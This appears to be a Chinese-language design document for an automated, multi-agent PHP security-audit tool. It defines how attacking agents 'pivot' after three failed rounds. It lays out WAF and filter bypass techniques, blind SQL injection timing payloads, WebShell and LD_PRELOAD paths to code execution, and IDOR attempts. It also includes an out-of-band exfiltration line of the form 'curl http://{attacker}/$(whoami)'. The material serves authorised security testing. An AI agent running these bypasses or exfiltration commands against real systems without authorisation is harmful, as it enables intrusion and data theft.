# 智能 Pivot 策略（Smart Pivot Strategy）

当 Phase-4 专家在攻击循环中**连续 3 轮失败**时，触发智能 Pivot 子流程。替代原有的静态映射，采用动态侦察+决策树模式。

---

## 触发条件

```
IF 当前轮次 >= 4 AND 最近连续 3 轮全部失败 (无 confirmed / 无 partial)
THEN 触发 Smart Pivot
```

## Pivot 决策流程

```
连续 3 轮失败
    │
    ▼
┌─────────────────────────────────────┐
│  Step 1: 重新侦察（Mini-Researcher）│
│  重读目标源码，寻找遗漏的过滤逻辑  │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Step 2: 交叉情报（Cross-Intel）    │
│  读取共享发现库                      │
│  检查其他专家是否发现了相关线索     │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Step 3: 决策树匹配                 │
│  根据失败模式选择 Pivot 方向        │
└──────────────┬──────────────────────┘
               │
         ┌─────┴─────┐
         │           │
    有新路径     无新路径
         │           │
    继续攻击    标记 failed
    (剩余轮次)   (停止浪费)
```

## Step 1: 重新侦察（Mini-Researcher）

失败后不立即切换策略，先执行 **30 秒快速侦察**:

### 1.1 重读过滤逻辑

```
重新读取 Sink 所在文件及其调用链上的所有文件，专注寻找:
- 之前遗漏的 sanitize/escape/filter 函数
- 中间件层的隐式过滤（如 Laravel 的 TrimStrings/ConvertEmptyStringsToNull）
- 全局 before_filter / request 拦截器
- .htaccess 或 Nginx 配置中的 URL 重写规则
```

### 1.2 检查替代入口

```
当前参数注入点被过滤时，检查:
- 同一 Controller 的其他 Action 是否调用相同 Sink
- 同一 Sink 函数是否有其他调用者（未被 trace 到的路径）
- 是否存在 API/CLI 入口绕过 Web 层过滤
- JSON API 是否跳过了 HTML 表单的过滤规则
```

### 1.3 环境条件复查

```
重新检查 environment_status.json:
- disable_functions 列表是否有遗漏的可用函数
- 是否有 PECL 扩展提供替代执行路径
- PHP 配置是否有特殊设置（如 auto_prepend_file）
```

## Step 2: 交叉情报（Cross-Intel）

读取共享发现库（`bash tools/audit_db.sh finding-read "$WORK_DIR"`），搜索相关发现:

```
匹配规则:
1. 同一文件路径的发现 → 可能揭示新攻击面
2. 同一控制器/路由的发现 → 可能提供认证绕过
3. 文件写入类发现 → 可能用于写入 WebShell 辅助当前攻击
4. 信息泄露类发现 → 可能暴露内部路径/配置辅助利用

交叉利用示例:
- infoleak-auditor 发现了 phpinfo() → 获取 disable_functions 精确列表
- filewrite-auditor 确认可写入 /tmp → RCE 尝试 LD_PRELOAD 路径
- authz-auditor 发现管理员端点 → 从管理员权限重新尝试被拦截的 payload
- ssrf-auditor 确认内网可达 → 通过 SSRF 中转绕过 WAF
```

## Step 3: 决策树

根据**失败模式分类**选择 Pivot 方向:

### 失败模式 A: WAF/过滤器拦截 (HTTP 403/406/拦截页面)

```
决策路径:
├─ 已尝试编码绕过?
│   ├─ 否 → 使用 payload_encoder.php 尝试: 双重编码 → Unicode → 宽字节
│   └─ 是 → 已尝试 WAF 特定绕过?
│       ├─ 否 → 加载 waf_bypass.md 中对应 WAF 的规则集
│       └─ 是 → 尝试协议层绕过:
│           ├─ HTTP 方法切换 (GET→POST→PUT→PATCH)
│           ├─ Content-Type 切换 (form→json→xml→multipart)
│           ├─ 分块传输编码 (Transfer-Encoding: chunked)
│           ├─ HTTP/2 特性利用
│           └─ 全部失败 → 检查 shared_findings 是否有 SSRF → 通过内网中转
```

### 失败模式 B: 参数被过滤/转义 (HTTP 200 但 payload 无效)

```
决策路径:
├─ 过滤类型已识别?
│   ├─ htmlspecialchars → 尝试: 属性注入 / JavaScript 事件 / CSS 注入
│   ├─ addslashes → 尝试: 宽字节 (%bf%27) / 数字型注入 / 子查询
│   ├─ preg_replace → 分析正则，构造不匹配的等效 payload
│   ├─ 自定义黑名单 → 逐字符测试，找到未过滤的关键字符
│   └─ 未识别 → 执行 Step 1.1 重新侦察
├─ 是否有替代参数?
│   └─ Step 1.2 检查替代入口
└─ 是否可以二阶攻击?
    └─ 检查参数是否被存储 → 存储位置是否有读取+拼接 → second_order 路径
```

### 失败模式 C: 无回显/盲注入 (HTTP 200 但无法确认)

```
决策路径:
├─ 时间盲注: sleep(5) / pg_sleep(5) / BENCHMARK(10000000,MD5('x'))
├─ 布尔盲注: 比较 true/false 条件的响应差异
├─ OOB 外带:
│   ├─ DNS: {payload}.{unique}.burpcollaborator.net
│   ├─ HTTP: curl http://{attacker}/$(whoami)
│   └─ 文件: 写入可预测路径后访问确认
└─ 错误触发: 故意制造语法错误观察错误处理差异
```

### 失败模式 D: 认证/授权阻断 (HTTP 401/403 非 WAF)

```
决策路径:
├─ 检查 credentials.json 是否有更高权限角色
├─ 检查 shared_findings 中是否有 authz-auditor 发现的认证绕过
├─ 尝试参数级越权 (IDOR): 替换 user_id / resource_id
└─ 尝试 HTTP 方法篡改: GET→POST / 添加 X-Original-URL header
```

### 失败模式 E: Sink 实际不可达 (代码路径分析错误)

```
决策路径:
├─ 重新读取调用链，确认是否存在前置条件未满足
├─ 检查是否需要特定 session 状态（如购物车非空、已填表单等）
├─ 检查是否有异步/队列执行（Sink 在 Job/Event 中，非同步触发）
└─ 确认不可达 → 降级为 ⚡ 潜在缺陷，停止尝试
```

## Pivot 结果处理

### Pivot 成功（找到新路径）

```
记录 Pivot 过程到 exploits/{sink_id}.json:
{
  "pivot_triggered_at_round": 4,
  "pivot_reason": "waf_block",
  "pivot_action": "mini_researcher",
  "pivot_discovery": "发现 JSON API 跳过了 WAF 规则",
  "resumed_at_round": 5,
  "final_status": "confirmed"
}
```

### Pivot 失败（无新路径）

```
提前终止攻击循环，不浪费剩余轮次:
{
  "pivot_triggered_at_round": 4,
  "pivot_reason": "param_filter",
  "pivot_action": "mini_researcher + cross_intel",
  "pivot_discovery": "无新攻击面",
  "early_termination": true,
  "final_status": "failed",
  "recommendation": "需要人工审查 app/Http/Middleware/SanitizeInput.php 的过滤逻辑"
}
```

> **原则**: 宁可提前终止并给出明确的人工审查建议，也不要在已穷尽策略后继续浪费轮次产生幻觉结果。
